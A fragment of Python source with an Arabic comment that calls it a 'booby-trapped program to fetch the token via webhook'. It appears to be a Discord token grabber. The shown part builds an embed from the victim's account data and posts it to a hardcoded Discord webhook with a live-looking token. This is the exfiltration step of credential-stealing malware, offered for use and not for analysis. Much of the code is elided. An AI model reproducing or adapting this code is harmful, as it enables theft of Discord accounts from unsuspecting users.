...
import base64
import datetime
# صنع برنامج ملغم لجلب التوكن عن طريق ويب هوك
                    ...
                    'embeds': [
                        {
                            ...
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.pn"
                            }
                        }
                    ],
                    "username": "By Eslam Darkness (Try Again)",  # تغيير الاسم هنا
                }

                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1359159330968178758/BmgU1iOoHN9k82FQAcg63mlJYm4oLqv1ssZDt6vtBLJQxuwrM5pxEgGTGJ2FhRJTMWC4', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders()))
